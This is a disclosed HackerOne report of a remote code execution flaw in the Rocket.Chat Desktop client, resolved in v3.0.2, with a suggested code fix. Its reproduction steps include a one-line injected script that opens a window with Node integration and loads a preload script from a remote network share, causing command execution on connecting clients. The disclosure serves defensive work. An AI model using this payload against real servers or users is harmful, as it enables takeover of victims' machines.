---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2020-11-07
submitted: 2020-07-27T12:00:29.604Z
bounty_usd: null
votes: 40
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "sectex"
source: "https://hackerone.com/reports/943725"
title: "Remote Code Execution in Rocket.Chat-Desktop"
---
# Remote Code Execution in Rocket.Chat-Desktop

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 40 | **Program:** Rocket.Chat | **Disclosed:** 2020-11-07

- Report: [https://hackerone.com/reports/943725](https://hackerone.com/reports/943725)
- CWE: N/A
- Submitted: 2020-07-27T12:00:29.604Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.
An attacker is able to create new BrowserWindow instances with a malicious preload script.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: < v3.0.0-develop

## Steps To Reproduce (by setting up a malicious server):
  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`
  1. Insert the following script:
  `window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))`
  1. Click `Save changes`
  1. Open Rocket.Chat-Desktop and connect to the server
  1. CMD.exe will pop up.

## Suggested mitigation

  * [`src » preload » jitsi.js`](https://github.com/RocketChat/Rocket.Chat.Electron/blob/develop/src/preload/jitsi.js)
  ```
  const wrapWindowOpen = (defaultWindowOpen) => (href, frameName, features) => {
       const settings = getSettings();

       features = ''; // <- should fix it

       if (settings && url.parse(href).host === settings.get('Jitsi_Domain')) {
         features = [
           features,
           'nodeIntegration=true',
           `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,
         ].join(',');
       }

       return defaultWindowOpen.call(window, href, frameName, features);
  };
  ```

## Impact

Remote Code Execution in Rocket.Chat-Desktop

## Timeline

- **Report Filed**
- **Report Triaged**
- **2020-10-08** @sectex: Hi @markus-rocketchat,

I installed v3.0.2 and it seems the issue is fixed.
Can we disclose this report?
- **Report Resolved**
- **Agreed On Going Public**
- **2020-10-09** @sectex: No problem! Thanks for letting me participate in your program!
- **Report Became Public**
